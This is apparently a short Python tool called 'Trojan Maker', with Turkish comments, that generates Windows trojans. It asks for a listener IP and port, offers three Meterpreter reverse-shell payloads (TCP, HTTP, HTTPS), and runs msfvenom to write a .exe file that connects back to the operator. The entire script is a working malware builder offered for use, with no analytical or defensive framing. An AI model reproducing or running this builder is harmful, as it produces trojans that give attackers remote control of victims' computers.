#!/usr/bin/env python
import os

os.system("apt-get install figlet -y")
os.system("clear")
os.system("figlet Trojan Maker")

targetip = input("Target IP (LHOST): ")
port = input("Port (LPORT): ")

print("""
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")

secim = input("Choose Payload: ")
save = input("File name: ")

# Payload listesi (Seçime göre karşılığını alacağız)
payload_list = {
    "1": "windows/meterpreter/reverse_tcp",
    "2": "windows/meterpreter/reverse_http",
    "3": "windows/meterpreter/reverse_https"
}

if secim in payload_list:
    choosen_payload = payload_list[secim]
    print(f" {choosen_payload} ")
    
    # Komutu oluştururken boşluklara dikkat!
    komut = f"msfvenom -p {choosen_payload} LHOST={targetip} LPORT={port} -f exe -o {save}"
    
    os.system(komut)
    print(f"SUCCESFUL: {save}")
else:
    print("WRONG .")
